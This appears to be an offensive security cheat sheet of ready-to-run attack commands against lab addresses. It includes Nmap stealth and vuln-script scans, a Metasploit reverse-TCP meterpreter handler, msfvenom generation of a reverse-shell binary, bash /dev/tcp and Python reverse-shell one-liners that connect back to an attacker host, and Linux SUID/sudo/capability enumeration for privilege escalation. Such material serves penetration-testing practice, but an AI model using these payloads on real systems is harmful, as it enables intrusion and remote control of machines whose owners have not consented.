Offensive Security Cheat Sheets

Fast, battle-tested terminal commands, exploit parameters, reverse shells, and privilege escalation one-liners.

1. Nmap Network Scanner Syntax

bash — Comprehensive TCP SYN & Version Scan 
# Fast SYN stealth scan, all 65535 ports, service banner grab, OS detect, aggressive timing
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 -oA target_full 192.168.56.101
bash — Nmap Vulnerability Scripting Engine (NSE) 
# Run vulnerability assessment scripts against discovered open ports
nmap -p 80,443,445 --script vuln,exploit 192.168.56.101

2. Metasploit Framework & Staged Handlers

msfconsole — Multi Handler Listener 
# Rapid reverse TCP meterpreter listener configuration
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.100; set LPORT 4444; exploit -j"
bash — msfvenom Staged Payload Generation 
# Generate 64-bit Linux reverse shell ELF binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f elf -o shell.elf

3. Reverse Shell One-Liners

bash — Bash TCP Reverse Socket 
bash -i >& /dev/tcp/192.168.56.100/9001 0>&1
bash — Python 3 Interactive TTY Shell 
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.56.100",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

4. Linux Privilege Escalation Enumeration

bash — Enumerate SUID Binaries & Sudo Permissions 
# Check current user sudo privileges without password
sudo -l

# Locate binaries with SUID permission set
find / -perm -u=s -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null
